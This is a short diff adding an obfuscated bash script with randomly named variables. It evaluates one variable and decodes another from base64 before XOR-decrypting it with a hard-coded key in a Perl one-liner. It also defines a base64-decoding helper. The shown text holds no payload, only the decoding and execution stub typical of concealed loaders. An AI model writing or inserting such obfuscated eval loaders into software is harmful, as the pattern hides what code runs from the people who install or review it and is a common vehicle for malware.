@@ -1,0 +1,4 @@
+#!/bin/bash
+eval "$oVGpzC"
+hFQEge=$(echo "$hJmyuI" | base64 --decode | perl -e 'my $key = pack("H*", "97bccf63605c587186ef47c30b101d78"); my $data = do { local $/; <STDIN> }; my $k = length($key); for(my $i=0; $i < length($data); $i++){ print chr( ord(substr($data, $i, 1)) ^ ord(substr($key, $i % $k, 1)) ); }')
+YVUJYC() { echo "$1" | base64 --decode; }
